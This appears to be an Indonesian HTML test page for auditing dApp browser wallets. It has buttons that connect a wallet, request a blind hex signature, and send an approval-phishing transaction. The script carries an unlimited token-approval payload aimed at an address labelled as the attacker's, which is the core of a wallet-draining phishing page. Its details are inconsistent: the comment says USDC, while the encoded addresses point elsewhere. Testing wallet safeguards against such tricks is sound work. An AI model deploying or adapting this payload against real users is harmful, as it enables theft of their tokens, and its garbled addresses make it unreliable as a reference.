<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Skenario Uji Audit Keamanan</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        button { display: block; width: 100%; padding: 15px; margin-bottom: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 5px; color: white; }
        .btn-connect { background: #6c757d; }
        .btn-sign { background: #007bff; }
        .btn-approval { background: #dc3545; }
        #log { margin-top: 20px; padding: 10px; background: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
    </style>
</head>
<body>
    <h1>Audit Keamanan dApp Browser</h1>
    <button id="connectBtn" class="btn-connect">1. Hubungkan Wallet</button>
    <button id="signBtn" class="btn-sign">2. Uji Blind Sign (Personal Sign)</button>
    <button id="approvalBtn" class="btn-approval">3. Uji Token Approval Phishing</button>

    <div id="log">Log aktivitas...</div>

    <script>
        const log = (msg) => document.getElementById('log').innerHTML += `<p>> ${msg}</p>`;
        let account = null;

        // Hubungkan Wallet
        document.getElementById('connectBtn').addEventListener('click', async () => {
            if (window.ethereum) {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                log("Terhubung: " + account);
            }
        });

        // Skenario 1: Blind Sign
        document.getElementById('signBtn').addEventListener('click', async () => {
            const msg = "0x556a6920636f626120616d616e"; // Data Hex Mentah
            const result = await window.ethereum.request({ method: 'personal_sign', params: [msg, account] });
            log("Hasil Sign: " + result);
        });

        // Skenario 2: Approval Phishing (Simulasi)
        document.getElementById('approvalBtn').addEventListener('click', async () => {
            // Data transaksi untuk memberikan izin (Approval) ke alamat penyerang
            const txParams = {
                to: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Contoh alamat penyerang
                from: account,
                data: '0x095ea7b3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', // Data approval USDC
                value: '0x0'
            };
            
            try {
                const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
                log("Tx Hash: " + txHash);
            } catch (err) {
                log("Error: " + err.message);
            }
        });
    </script>
</body>
</html>
